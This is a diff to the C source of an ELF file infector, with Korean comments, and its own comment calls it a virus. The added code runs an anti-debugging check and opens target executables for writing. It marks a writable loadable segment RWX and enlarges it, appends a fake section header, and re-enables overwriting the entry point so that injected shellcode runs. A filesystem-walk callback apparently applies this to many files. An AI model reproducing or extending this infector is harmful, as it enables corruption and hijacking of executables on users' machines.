@@ -65,79 +65,100 @@ int activate(){
 void change_entrypoint(const char* fpath, char *newaddr){
 	int fd;
 	int i;
-	Elf64_Shdr *shdr;
+	Elf64_Shdr shdr;
 	Elf64_Phdr phdr;
 	Elf64_Ehdr ehdr;
-	int plen, slen;
-	unsigned long b = brk(0), k, sdata, pdata;
+	int shellcodeloc;
 	
 	if(access(fpath,R_OK|W_OK|X_OK)!=0){ 
 		printf("[ERROR] Permission error(%s)\n",fpath);
 		return 0;
-		//exit(1);
 	}
 	if(!activate()){
 		printf("[ERROR] Debugger detected(%s)\n",fpath);
 		return 0;
-		//exit(1);
 	}
-	fd = open(fpath, O_RDWR); //자기자신을 open할경우 여기서 fail나서 따로신경써줄필요ㄴㄴ
+	fd = open(fpath, O_RDWR); // Cannot open virus file itself.
 	if (fd < 0){
 		printf("[ERROR] fd error(%s)\n",fpath);
 		return 0;
-		//exit(1); 
 	}
 	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
 		printf("[ERROR] ehdr read error(%s)\n",fpath);
 		return 0;
-		//exit(1); 
 	}
-	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ //elf가 아니라면
+	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ 
 		printf("[ERROR] not ELF!(%s) \n",fpath);
 		return 0;
-		//exit(1);
 	}
 	
 	printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
 	
-	// 여러개의 phdr정보들을 읽기
-	lseek(fd, ehdr.e_phoff, SEEK_SET); // e_phoff 만큼 테이프를 돌린다
-	for(i=0;i<ehdr.e_phnum;i++){
-		if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)){
-			printf("[ERROR] phdr read error(%s)\n",fpath);
-			return 0;
-			//exit(1); 
-		}
-		else{
-			printf("[SUCCESS] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
-		}
-	}
-	
-	//1. 프로그램헤더에서 Loadable Segment의 권한을 RWX로 셋팅
-	// 프로그램헤더 엔트리사이즈 = ehdr.e_phentsize
-	// 프로그램헤더 갯수 = ehdr.e_phnum
-	
-	
-	//1. elf헤더의 엔트리갯수 늘리기
+	// elf헤더의 섹션갯수 늘리기
+	// 실제섹션은 31갠데 섹션갯수만32로늘어나면 모종의이유로 gdb심볼로드가 안됨. 
 	ehdr.e_shnum = ehdr.e_shnum + 1;
 	lseek(fd, 0, SEEK_SET);
 	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); 
 	printf("[INFECTED] Section header entry num (%s): %d\n", fpath, ehdr.e_shnum);
 	
-	//2. 섹션헤더의...가아니라 파일의맨뒤에 가짜 섹션테이블을추가하기
+	
+	
+	// 여러개의 phdr 정보들을 읽고 대상프로그램헤더를 가져오기
+	lseek(fd, ehdr.e_phoff, SEEK_SET); // e_phoff 로 테이프를보낸다. 
+	for(i=0;i<ehdr.e_phnum;i++){
+		if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)){
+			printf("[ERROR] phdr read error(%s)\n",fpath);
+			return 0;
+		}
+		else{
+			printf("[INFO] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
+			
+			// (RW_) Loadable Segment 임과동시에 PF_Read_Write (6) 권한인세그먼트의경우
+			if(phdr.p_type==1 && phdr.p_flags==6){
+				lseek(fd, -sizeof(phdr), SEEK_CUR); // 쓰기위해되돌아감
+				printf("[BEFORE] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
+				phdr.p_flags=7; //Loadable Segment의 권한을 RWX로 셋팅
+				phdr.p_filesz += 0x1000; //페이지사이즈 늘리기
+				phdr.p_memsz = phdr.p_filesz;  //페이지사이즈 늘리기
+				write(fd, &phdr, sizeof(phdr));
+				printf("[AFTER] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
+				break; //대상 phdr를 읽은상태에서 break.
+			}
+		}
+	}
+	
+	// 프로그램헤더 엔트리사이즈 = ehdr.e_phentsize
+	// 프로그램헤더 갯수 = ehdr.e_phnum
+	
+	
+	//파일의마지막에 가짜섹션을 덧붙이기
+	//Prepare fake section 
+	shdr.sh_name = 0;      
+	shdr.sh_type = 3;      
+	shdr.sh_flags = 0;     
+	shdr.sh_addr = (phdr.p_vaddr & 0xfffff000) + (phdr.p_filesz & 0xfffff000) + 0x1000; //스타트어드레스
+	shdr.sh_offset = ehdr.e_shoff + (ehdr.e_shentsize * ehdr.e_shnum);//파일의사이즈
+	shdr.sh_size = 0x1000; 
+	shdr.sh_link = 0;      
+	shdr.sh_info = 0;      
+	shdr.sh_addralign = 1; 
+	shdr.sh_entsize = 0;   
+	printf("[NEW] shdr.sh_addr(0x%x) = (phdr.p_vaddr(0x%x) & 0xfffff000) + (phdr.p_filesz(0x%x) & 0xfffff000) + 0x1000\n",shdr.sh_addr,phdr.p_vaddr,phdr.p_filesz);
+	printf("[NEW] shdr.sh_addr = 0x%x, shdr.sh_offset = 0x%x\n",shdr.sh_addr,shdr.sh_offset);
+	
+	shellcodeloc = shdr.sh_addr + shdr.sh_offset;
+	
+	lseek(fd,0,SEEK_END); 
+	write(fd, &shdr, sizeof(shdr));
+	write(fd, "AAAAAAAA",8);
+	
+	
 	// Entry point overwriting routine.. Don't touch it!
-	/*
 	ehdr.e_entry = strtol(newaddr, NULL, 16); // change ehdr struct
 	lseek(fd, 0, SEEK_SET);
-	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); //write 실패
-
+	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0; //write 실패
 	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
-	*/
 	
-	
-
-	
-	//exit(0);
 }
 
 int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
